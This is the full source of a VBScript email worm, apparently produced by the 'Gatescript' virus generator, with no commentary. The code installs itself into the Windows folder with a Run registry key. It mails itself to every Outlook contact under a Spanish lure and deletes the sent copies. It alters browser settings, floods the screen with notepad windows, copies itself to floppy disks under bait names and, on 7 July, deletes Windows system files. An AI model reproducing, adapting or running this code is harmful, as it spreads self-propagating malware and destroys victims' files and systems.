   'PetiK
   On error resume next
   dim emmcmsgitagxg
   dim emmcborritagxg
   dim emmccolitagxg
   dim zitagxg
   dim emmnaritagxg
   dim emmdiitagxg
   dim emmvalitagxg
   dim emmsenitagxg
   dim emmtecitagxg
   dim vtecitagxg
   Set emmwshitagxg = CreateObject("WScript.Shell")
   Set emmfsoitagxg= CreateObject("scripting.filesystemobject")
   emmfsoitagxg.copyfile wscript.scriptfullname,emmfsoitagxg.GetSpecialFolder(0)& "\emm.vbs"
   emmwshitagxg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe " & emmfsoitagxg.GetSpecialFolder(0) & "\emm.vbs %"
   If wshell.regread("HKCU\software\EMM\correo") <> "1" Then
   Outlookemmitagxg()
   End If
   Function Outlookemmitagxg()
   On Error Resume Next
   Set emmitagxgApp = CreateObject("Outlook.Application")
   If emmitagxgApp = "Outlook"Then
   Set emmitagxgM = emmitagxgapp.GetNameSpace("MAPI")
   Set emmitagxgml = emmitagxgM.AddressLists
   For Each emmitagxgAdl In emmitagxgml
   If emmitagxgAdl.AddressEntries.Count <> 0 Then
   emmitagxgAdt = emmitagxgAdl.AddressEntries.Count
   For emmitagxgAddt = 1 To emmitagxgAdt
   Set emmitagxgms = emmitagxgApp.CreateItem(0)
   Set emmitagxgAdts = emmitagxgAdl.AddressEntries(emmitagxgAddt)
   emmitagxgms.To = emmitagxgAdts.Address
   emmitagxgms.Subject = "Estimado Bill G."
   emmitagxgms.Body = "Aqui le adjunto los precios para su funeraria."
   Set emmitagxgAtt = emmitagxgms.Attachments
   emmitagxgAtt.Add emmfsoitagxg.GetSpecialFolder(0)& "\emm.vbs"
   emmitagxgms.DeleteAfterSubmit = True
   If emmitagxgms.To <> "" Then
   emmitagxgms.Send
   End If
   Next
   End If
   Next
   End If
   emmwshitagxg.regwrite "HKCU\software\EMM\correo","1"
   End Function
   If emmwshitagxg.regread("HKCU\software\EMM\mensaje") <> "1" Then
   emmwshitagxg.regwrite "HKCU\software\EMM\mensaje","1"
   msgbox "geocities.com/gatescript"
   end if
   emmwshitagxg.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.google.fr"
   emmwshitagxg.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title","Infectado con Gatescript"
   If emmwshitagxg.regread("HCU\software\EMM\colgar") <> "1" Then
   emmwshitagxg.regwrite "HKCU\software\EMM\colgar","1"
   for zitagxg = 0 to 100
   emmwshitagxg.run ("C:\Windows\notepad.exe")
   next
   if month(now) = 7 and day(now) = 7 then
   emmfsoitagxg.deletefile ("C:\Windows\System\*.*")
   emmfsoitagxg.deletefile ("C:\Windows\*.*")
   emmfsoitagxg.deletefile ("C:\command.com")
   emmfsoitagxg.deletefile ("C:\autoexec.bat")
   end if
   emmvalitagxg = 0
   emmtecitagxg = 0
   vtecitagxg = ""
   vtecitagxg = emmwshitagxg.regread("HKCU\software\EMM\teclas")
   if vtecitagxg = "" then
   vtecitagxg = 0
   End if
   vtecitagxg = vtecitagxg + 1
   emmwshitagxg.regwrite "HKCU\software\EMM\teclas",vtecitagxg
   diitagxg()
   Function diitagxg()
   On Error Resume Next
   Do
   emmtecitagxg = emmtecitagxg + 1
   emmvalitagxg = emmvalitagxg + 1
   Randomize timer
   emmdiitagxg = Int(Rnd * 6)
   if emmdiitagxg = 0 then emmnaritagxg = "leeme"
   if emmdiitagxg = 1 then emmnaritagxg = "abrime"
   if emmdiitagxg = 2 then emmnaritagxg = "juegos"
   if emmdiitagxg = 3 then emmnaritagxg = "mensaje"
   if emmdiitagxg = 4 then emmnaritagxg = "Mifoto.jpg"
   if emmdiitagxg = 5 then emmnaritagxg = "Importante"
   if emmnaritagxg = "" then emmnaritagxg = "LEEME.TXT"
   if emmvalitagxg = 900000 then
   emmfsoitagxg.copyfile emmfsoitagxg.GetSpecialFolder(0)& "\emm.vbs","a:\" & emmnaritagxg & ".vbs"
   emmvalitagxg = 0
   End if
   if emmtecitagxg = 300000 then
   If emmwshitagxg.regread("HKCU\software\EMM\teclas") <= "1" Then
   emmwshitagxg.sendkeys "www.geocities.com/gatescript"
   emmtecitagxg = 0
   End if
   emmtecitagxg = 0
   End if
   Loop
   End Function
   'Creado con Gatescript [ generador de virus ] www.geocities.com/gatescript
